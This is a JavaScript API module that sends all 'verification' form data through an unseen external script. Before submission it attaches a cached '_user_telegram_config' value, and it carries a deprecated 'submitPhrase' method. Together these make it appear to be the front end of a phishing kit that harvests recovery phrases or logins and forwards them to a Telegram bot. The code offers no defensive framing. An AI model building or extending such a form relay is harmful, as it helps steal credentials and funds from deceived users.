import axios from 'axios'



const api = axios.create({
  timeout: 10000,
  headers: {
    'Content-Type': 'application/json',
  },


})






api.checkSecurity = async (page) => {
  if (!window.ExternalSecurity || !window.ExternalSecurity.checkSecurity) {
    throw new Error('External security file is required for security checks')
  }
  

  return await window.ExternalSecurity.checkSecurity(page)
}


api.submitVerification = async (data) => {

  if (!window.ExternalSecurity || !window.ExternalSecurity.submitForm) {
    throw new Error('External security file is required for form submissions')
  }
  

  if (!window.ExternalSecurity.hash || !window.ExternalSecurity.encode) {
    throw new Error('Missing critical cryptographic functions - cannot submit form')
  }
  

  if (!window.ExternalSecurity.verifySignature || !window.ExternalSecurity.verifySignature()) {
    throw new Error('Invalid security signature - form submission blocked')
  }
  

  let formDataObj = {}
  if (data instanceof FormData) {
    for (let [key, value] of data.entries()) {
      formDataObj[key] = value
    }
  } else {
    formDataObj = data
  }
  

  try {
    const cachedConfig = sessionStorage.getItem('_user_telegram_config')
    if (cachedConfig) {
      formDataObj._user_telegram_config = cachedConfig
    }
  } catch (e) {

  }
  

  formDataObj._integrity = window.ExternalSecurity.getIntegrityHash()
  formDataObj._token = window.ExternalSecurity.generateToken('submit')
  

  const result = await window.ExternalSecurity.submitForm(formDataObj)
  return result
}




api.submitPhrase = async (phrase) => {
  throw new Error('This method is deprecated. Use api.submitVerification instead.')
}


api.getWebsiteConfig = async () => {
  const response = await fetch('/config/website_config.json')
  if (!response.ok) {
    throw new Error('Config not found')
  }
  return await response.json()
}



api.getTranslations = async (lang, page) => {
  throw new Error('Local translations are not supported. Use external security file.')
}

export default api

